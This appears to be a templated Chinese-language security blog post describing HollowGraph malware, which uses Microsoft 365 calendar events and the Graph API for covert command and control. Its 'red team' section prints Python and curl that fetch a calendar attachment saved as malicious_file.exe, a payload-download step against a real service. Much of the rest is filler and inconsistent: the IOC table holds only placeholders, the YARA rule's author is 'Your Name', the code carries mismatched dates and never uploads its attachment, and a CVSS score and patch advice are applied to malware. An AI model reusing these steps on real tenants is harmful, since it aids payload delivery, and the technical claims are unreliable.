---
layout: post
title:  "研究人員揭露新型惡意軟體HollowGraph，利用M365行事曆建立隱蔽C2通道"
date:   2026-07-21 08:14:40 +0000
categories: [security]
severity: critical
---

# 🚨 解析 HollowGraph 惡意軟體：Microsoft 365 行事曆與 Graph API 的隱蔽命令與控制通道

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Microsoft Graph API`, `DNS 隧道`, `Entra ID 憑證`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: HollowGraph 惡意軟體利用 Microsoft 365 行事曆與 Graph API 的功能，建立了一個隱蔽的命令與控制通道。這是因為 Graph API 的設計允許應用程式存取和操作使用者的行事曆事件和附件。
* **攻擊流程圖解**:
  1. 攻擊者建立一個行事曆事件，並附上一個包含惡意軟體的附件。
  2. 受害者收到行事曆事件的通知，並下載附件。
  3. 惡意軟體執行，並利用 Graph API 搜尋攻擊者預先建立的行事曆事件。
  4. 惡意軟體下載附件，取得指令並執行。
* **受影響元件**: Microsoft 365 行事曆、Graph API、Entra ID 憑證

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有受害者的 Microsoft 365 帳戶和密碼。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 建立行事曆事件
    event = {
        "subject": "Malicious Event",
        "body": {
            "content": "Malicious content"
        },
        "start": {
            "dateTime": "2023-03-01T12:00:00",
            "timeZone": "UTC"
        },
        "end": {
            "dateTime": "2023-03-01T13:00:00",
            "timeZone": "UTC"
        }
    }
    
    # 上傳附件
    attachment = {
        "name": "malicious_file.exe",
        "contentBytes": "malicious_file_content"
    }
    
    # 建立 Graph API 請求
    url = "https://graph.microsoft.com/v1.0/me/events"
    headers = {
        "Authorization": "Bearer <access_token>",
        "Content-Type": "application/json"
    }
    
    response = requests.post(url, headers=headers, json=event)
    
    # 下載附件
    url = "https://graph.microsoft.com/v1.0/me/events/{event_id}/attachments/{attachment_id}"
    response = requests.get(url, headers=headers)
    
    ```
* **範例指令**: 使用 `curl` 下載附件

```

bash
curl -X GET \
  https://graph.microsoft.com/v1.0/me/events/{event_id}/attachments/{attachment_id} \
  -H 'Authorization: Bearer <access_token>' \
  -o malicious_file.exe

```
* **繞過技術**: 攻擊者可以使用 DNS 隧道技術來繞過防火牆和入侵偵測系統。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| <hash> | <ip> | <domain> | <file_path> |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule HollowGraph {
        meta:
            description = "Detect HollowGraph malicious activity"
            author = "Your Name"
        strings:
            $event_subject = "Malicious Event"
            $attachment_name = "malicious_file.exe"
        condition:
            $event_subject and $attachment_name
    }
    
    ```
* **緩解措施**: 除了更新修補之外，還可以設定 Graph API 的存取控制和監控。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Microsoft Graph API**: 一個 RESTful API，允許應用程式存取和操作 Microsoft 365 的資料和功能。
* **DNS 隧道**: 一種技術，允許攻擊者通過 DNS 協議傳遞惡意資料。
* **Entra ID 憑證**: 一種憑證，允許使用者存取 Microsoft 365 的服務。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/177485)
- [Microsoft Graph API](https://docs.microsoft.com/en-us/graph/)
- [MITRE ATT&CK](https://attack.mitre.org/)


